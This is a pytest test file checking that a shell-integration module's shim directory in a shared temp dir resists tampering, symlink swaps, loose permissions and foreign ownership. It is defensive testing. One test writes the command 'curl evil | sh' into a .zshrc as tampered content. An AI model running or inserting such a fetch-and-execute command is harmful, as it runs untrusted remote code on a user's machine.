"""`_shim_root` must not trust a predictable path in a shared temp dir."""
import os
import stat
import tempfile

import pytest

from fused_render import shell_integration as si

pytestmark = pytest.mark.skipif(os.name == "nt", reason="POSIX permissions")


@pytest.fixture
def tmp_root(monkeypatch, tmp_path):
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(tmp_path))
    monkeypatch.setattr(si, "_FALLBACK_ROOT", None)
    return tmp_path


def _complete(root):
    for rel, text in si._SHIM_FILES.items():
        with open(os.path.join(root, rel), encoding="utf-8") as fh:
            assert fh.read() == text
    mode = stat.S_IMODE(os.lstat(root).st_mode)
    assert mode & 0o022 == 0


def test_builds_and_reuses(tmp_root):
    root = si._shim_root()
    _complete(root)
    assert os.path.dirname(root) == str(tmp_root)
    assert si._shim_root() == root


def test_missing_file_is_rebuilt(tmp_root):
    root = si._shim_root()
    os.unlink(os.path.join(root, "zsh", ".zshrc"))
    assert si._shim_root() == root
    _complete(root)


def test_half_deleted_dir_is_rebuilt(tmp_root):
    root = si._shim_root()
    for rel in si._SHIM_FILES:
        os.unlink(os.path.join(root, rel))
    assert si._shim_root() == root
    _complete(root)


def test_tampered_content_is_rebuilt(tmp_root):
    root = si._shim_root()
    path = os.path.join(root, "zsh", ".zshrc")
    with open(path, "w") as fh:
        fh.write("curl evil | sh\n")
    assert si._shim_root() == root
    _complete(root)


def test_group_writable_root_is_not_trusted(tmp_root):
    root = si._shim_root()
    os.chmod(root, 0o777)
    new = si._shim_root()
    _complete(new)


def test_symlink_root_is_replaced(tmp_root):
    root = si._shim_root()
    target = tmp_root / "elsewhere"
    target.mkdir()
    for rel, text in si._SHIM_FILES.items():
        (target / rel).parent.mkdir(parents=True, exist_ok=True)
        (target / rel).write_text(text)
    import shutil
    shutil.rmtree(root)
    os.symlink(target, root)
    new = si._shim_root()
    assert not os.path.islink(new)
    _complete(new)


def test_foreign_owned_root_uses_private_fallback(tmp_root, monkeypatch):
    real = os.getuid()
    mine = si._shim_root()  # created by the real uid
    # Lie about our uid: the same directory, moved to the path the fake uid
    # would use, now looks owned by someone else.
    monkeypatch.setattr(os, "getuid", lambda: real + 1)
    fake_path = mine.replace("-%d-" % real, "-%d-" % (real + 1))
    os.rename(mine, fake_path)
    got = si._shim_root()
    assert got != fake_path
    assert os.path.basename(got).startswith("fused-render-shell-")
    for rel, text in si._SHIM_FILES.items():
        with open(os.path.join(got, rel), encoding="utf-8") as fh:
            assert fh.read() == text
    assert os.path.isdir(fake_path)  # the foreign dir is left alone
